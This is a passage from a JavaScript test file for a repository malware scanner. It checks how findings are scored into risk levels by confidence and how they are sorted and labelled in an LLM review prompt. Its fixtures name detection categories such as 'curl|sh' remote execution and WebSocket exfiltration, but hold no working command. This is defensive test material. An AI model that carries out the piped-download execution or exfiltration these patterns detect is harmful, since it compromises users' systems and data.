    findings: [{ id: 'eval-exec', severity: 'critical', confidence: 0.25, explanation: 'x', file: 'a.js', line: 1 }],
    privacyNotes: [],
  });
  assert.equal(low.risk_level, 'moderate');
  const high = classifyRiskLevel({
    findings: [{ id: 'eval-exec', severity: 'critical', confidence: 0.9, explanation: 'y', file: 'b.js', line: 2 }],
    privacyNotes: [],
  });
  assert.equal(high.risk_level, 'high');
});

test('classifyRiskLevel: risk_evidence 透出 confidence（有则带，无则缺省）', () => {
  const withConf = classifyRiskLevel({
    findings: [{ id: 'eval-exec', severity: 'critical', confidence: 0.9, explanation: 'z', file: 'c.js', line: 3 }],
    privacyNotes: [],
  });
  assert.ok(withConf.risk_evidence.some((e) => e.file === 'c.js' && e.confidence === 0.9), '应透出 confidence');
  const noConf = classifyRiskLevel({
    findings: [{ id: 'eval-exec', severity: 'critical', explanation: 'w', file: 'd.js', line: 4 }],
    privacyNotes: [],
  });
  assert.ok(noConf.risk_evidence.every((e) => e.confidence === undefined), '无 confidence 时不伪造该字段');
});


// --- 方向2: LLM 复核消费 confidence（排序 + 标注） ---
test('llmReview: 结构化 findings 按置信度降序渲染，低置信标注疑似误报、definite 标注确定恶意', async () => {
  let capturedBody = null;
  const dossier = {
    repo: 'a/b',
    verdict: 'flagged',
    externalHosts: [],
    packageSummary: [],
    samples: [],
    findings: [
      { severity: 'critical', id: 'websocket-exfil', explanation: 'WebSocket 外联', file: 'w.js', line: 3, confidence: 0.25 },
      { severity: 'warning', id: 'base64', explanation: 'Base64 解码', file: 'b.js', line: 7, confidence: 0.8 },
      { severity: 'critical', id: 'remote-exec', explanation: 'curl|sh', file: 's.sh', line: 1, confidence: 0.95 },
      { severity: 'warning', id: 'eval-exec', explanation: '动态执行', file: 'e.js', line: 9 },
    ],
  };
  const res = await llmReview(dossier, {
    apiKey: 'x',
    fetchImpl: async (url, opts) => {
      capturedBody = JSON.parse(opts.body);
      return {
        ok: true,
        json: async () => ({ choices: [{ message: { content: JSON.stringify({ escalation: 'none', additionalFindings: [], rationale: 'x' }) } }] }),
      };
    },
  });
  assert.equal(res.status, 'ok');
  const prompt = capturedBody.messages[1].content;
  // 高置信 remote-exec(0.95) 应排最前
  const iRemote = prompt.indexOf('remote-exec');
  const iWs = prompt.indexOf('websocket-exfil');
  assert.ok(iRemote !== -1 && iWs !== -1 && iRemote < iWs, '高置信 finding 应排前面');
  // 低置信 websocket-exfil(0.25) 标疑似误报
  assert.match(prompt, /websocket-exfil.*疑似误报/s, '低置信应标注疑似误报');
  // definite-malice remote-exec 标注确定恶意
  assert.match(prompt, /remote-exec.*确定恶意/s, 'definite-malice 应标注确定恶意');
  // 渲染包含置信度数值
  assert.match(prompt, /conf:0\.95/, '应渲染高置信数值');
  assert.match(prompt, /conf:0\.25/, '应渲染低置信数值');
});
